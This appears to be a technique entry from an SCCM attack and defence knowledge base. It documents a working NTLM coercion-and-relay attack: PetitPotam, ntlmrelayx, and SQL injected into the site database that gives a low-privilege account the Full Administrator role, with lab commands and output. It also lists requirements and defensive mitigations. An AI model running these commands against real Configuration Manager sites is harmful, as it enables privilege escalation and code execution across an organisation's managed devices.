# TAKEOVER-1.1

## Description
Coerce NTLM from primary site server and relay to MSSQL on remote site database

## MITRE ATT&CK TTPs
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements
The site database is not hosted on the primary site server

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on the coercion target, the primary site server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
    - Domain computer account is not in `Protected Users`
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target

### Relay
- Connectivity from the relay server to MSSQL (TCP/1433) on the relay target, the site database
- Extended protection for authentication not required on the site database
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target

## Summary
By default, the Active Directory domain computer accounts for primary site servers (including CAS site servers), systems hosting the SMS Provider role, and passive site servers are granted the `db_owner` role in their respective site's MSSQL database. An attacker who is able to successfully coerce NTLM authentication from one of these accounts and relay it to the site database can use these permissions to grant an arbitrary domain account the SCCM "Full Administrator" role.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [PREVENT-14: Require EPA on AD CS and site databases](../../../defense-techniques/PREVENT/PREVENT-14/prevent-14_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Examples
1. (Linux) Use `SCCMHunter` to get the hex-formatted SID of the Active Directory user you'd like to grant the Full Administrator role in SCCM, as well as the MSSQL statements required to grant the role to the user:

    ```
    $ python3 sccmhunter.py mssql -dc-ip 192.168.57.100 -d MAYYHEM.LOCAL -u 'lowpriv' -p 'P@ssw0rd' -debug -tu lowpriv -sc ps1 -stacked
        
    [13:13:33] DEBUG    [+] Bind successful ldap://192.168.57.100:389 - cleartext                                        
    [13:13:33] INFO     [*] Resolving lowpriv SID...                                                                     
    [13:13:33] DEBUG    [+] Found lowpriv SID: S-1-5-21-622943703-4251214699-2177406285-1112                             
    [13:13:33] INFO     [*] Converted lowpriv SID to 0x010500000000000515000000D75D21256B6364FD4D95C88158040000          
    [13:13:33] DEBUG    [+] Found domain netbiosname: MAYYHEM                                                            
    [13:13:33] INFO     [*] Use the following to add lowpriv as a Site Server Admin.                                     

    USE CM_ps1; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000D75D21256B6364FD4D95C88158040000,'MAYYHEM\lowpriv',0,0,'','','','','ps1');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00004','1');
    ```

    (Windows) Use `SharpSCCM`to get the hex-formatted SID of the Active Directory user you'd like to grant the Full Administrator role in SCCM, and assemble the query based on the output from the example `sccmhunter` command above, substituting the user SID, domain, and site code (`ps1` in this example) where appropriate.

    ```
    > .\SharpSCCM.exe local user-sid

    [+] Current user: MAYYHEM\lowpriv
    [+] Active Directory SID for current user: S-1-5-21-622943703-4251214699-2177406285-1112
    [+] Active Directory SID (hex): 0x010500000000000515000000D75D21256B6364FD4D95C88158040000
    [+] Completed execution in 00:00:00.1959610
    ```

2. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the site database server and the MSSQL service using the SQL statements assembled in the previous step:

    ```
    # impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t mssql://<SITE_DATABASE_IP> -q "USE CM_ps1; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000D75D21256B6364FD4D95C88158040000,'MAYYHEM\lowpriv',0,0,'','','','','ps1');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00004','1');"

    Impacket v0.11.0 - Copyright 2023 Fortra

    [2024-02-22 16:37:11] [*] Protocol Client MSSQL loaded..
    [2024-02-22 16:37:11] [*] Protocol Client LDAPS loaded..
    [2024-02-22 16:37:11] [*] Protocol Client LDAP loaded..
    [2024-02-22 16:37:11] [*] Protocol Client RPC loaded..
    [2024-02-22 16:37:11] [*] Protocol Client HTTPS loaded..
    [2024-02-22 16:37:11] [*] Protocol Client HTTP loaded..
    [2024-02-22 16:37:11] [*] Protocol Client IMAP loaded..
    [2024-02-22 16:37:11] [*] Protocol Client IMAPS loaded..
    [2024-02-22 16:37:11] [*] Protocol Client SMTP loaded..
    [2024-02-22 16:37:11] [*] Protocol Client SMB loaded..
    [2024-02-22 16:37:11] [*] Protocol Client DCSYNC loaded..
    [2024-02-22 16:37:11] [*] Running in relay mode to single host
    [2024-02-22 16:37:11] [*] Setting up SMB Server
    [2024-02-22 16:37:11] [*] Setting up HTTP Server on port 80
    [2024-02-22 16:37:11] [*] Setting up WCF Server
    [2024-02-22 16:37:11] [*] Setting up RAW Server on port 6666

    [2024-02-22 16:37:11] [*] Servers started, waiting for connections
    ```

3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:

    ```
    # python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>              

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the site database server to execute the SQL statements:

    ```
    [2024-02-22 16:37:17] [*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.57.50, attacking target mssql://192.168.57.51
    [2024-02-22 16:37:17] [*] Authenticating against mssql://192.168.57.51 as MAYYHEM/SITE-SERVER$ SUCCEED
    [2024-02-22 16:37:17] [*] Executing SQL: USE CM_ps1; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000D75D21256B6364FD4D95C88158040000,'MAYYHEM\lowpriv',0,0,'','','','','ps1');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'MAYYHEM\lowpriv'),'SMS0001R','SMS00004','1');
    [2024-02-22 16:37:17] [*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
    [2024-02-22 16:37:17] [*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_PS1
    [2024-02-22 16:37:17] [*] INFO(SITE-DB): Line 1: Changed database context to 'CM_PS1'.
    ```

4. Confirm that the account now has the `Full Administrator` role by querying WMI on an SMS Provider.

    On Linux, using `sccmhunter`:
    ```
    $ python3 sccmhunter.py  admin -u lowpriv -p <PASSWORD> -ip SITE-SMS          

    [15:36:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
    () (C:\) >> show_admins
    [15:37:43] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
    [15:37:44] INFO     Current Full Admin Users:                                                                                                                                                            
    [15:37:44] INFO     MAYYHEM\sccmadmin                                                                                                                                                                    
    [15:37:44] INFO     MAYYHEM\lowpriv 
    ```

    On Windows, using `SharpSCCM`:
    ```
    > .\SharpSCCM.exe get users -n lowpriv -sms SITE-SMS -sc ps1

    [+] Connecting to \\SITE-SMS\root\SMS\site_ps1
    [+] Executing WQL query: SELECT * FROM SMS_R_User WHERE UniqueUserName LIKE '%lowpriv%'
    -----------------------------------
    SMS_R_User
    -----------------------------------
    AADTenantID:
    AADUserID:
    ADObjectCreationTime: 20230721132400.000000+***
    AgentName: SMS_AD_USER_DISCOVERY_AGENT, SMS_AD_SECURITY_GROUP_DISCOVERY_AGENT
    AgentSite: PS1, PS1
    AgentTime: 20230721202501.000000+***, 20230803202502.000000+***
    CloudUserId:
    CreationDate: 20230721202502.760000+***
    DistinguishedName: CN=Low Priv,CN=Users,DC=MAYYHEM,DC=LOCAL
    FullDomainName: MAYYHEM.LOCAL
    FullUserName: Low Priv
    Mail:
    Name: MAYYHEM\lowpriv (Low Priv)
    NetworkOperatingSystem: Windows NT
    ObjectGUID: Can't display UInt8 as a String
    PrimaryGroupID: 513
    ResourceId: 2063597571
    ResourceType: 4
    SecurityGroupName: MAYYHEM\Domain Users
    SID: S-1-5-21-622943703-4251214699-2177406285-1112
    UniqueUserName: MAYYHEM\lowpriv
    UserAccountControl: 66048
    UserContainerName: MAYYHEM\USERS
    UserGroupName: MAYYHEM\Domain Users
    UserName: lowpriv
    UserOUName:
    UserPrincipalName: lowpriv@MAYYHEM.LOCAL
    WindowsNTDomain: MAYYHEM
    -----------------------------------
    [+] Completed execution in 00:00:00.9878140
    ```


## References
- Chris Thompson, [SCCM Site Takeover via Automatic Client Push Installation](https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)
- Chris Thompson, [SCCM Hierarchy Takeover: One Site to Rule Them All](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087)
- Garrett Foster, [SCCM Hierarchy Takeover with High Availability](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43)
- Garrett Foster, [sccmhunter](https://github.com/garrettfoster13/sccmhunter)
- Chris Thompson, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
